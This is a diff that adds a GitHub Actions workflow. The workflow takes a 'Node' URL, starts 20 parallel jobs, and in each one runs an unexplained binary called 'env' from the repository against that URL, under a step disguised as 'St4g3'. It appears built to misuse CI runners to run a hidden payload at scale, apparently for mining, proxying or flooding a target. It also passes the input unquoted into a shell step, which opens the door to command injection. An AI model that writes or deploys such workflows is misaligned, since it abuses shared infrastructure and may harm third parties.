@@ -1,0 +1,49 @@
+name: num
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        description: "Node"
+        required: true
+        
+env:
+  DEFAULT_JOBS: 20
+
+jobs:
+
+  generate-matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set.outputs.matrix }}
+
+    steps:
+      - id: set
+        run: |
+
+          JOBS=${{ env.DEFAULT_JOBS }}
+
+          MATRIX=$(seq 1 $JOBS | jq -R . | jq -cs .)
+
+          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT
+
+  job:
+    needs: generate-matrix
+    runs-on: ubuntu-latest
+
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        job: ${{ fromJSON(needs.generate-matrix.outputs.matrix) }}
+
+    steps:
+
+      - uses: actions/checkout@v4
+
+      - name: St4g3
+        run: |
+          chmod +x env
+          ./env "${{ github.event.inputs.url }}"
+
+
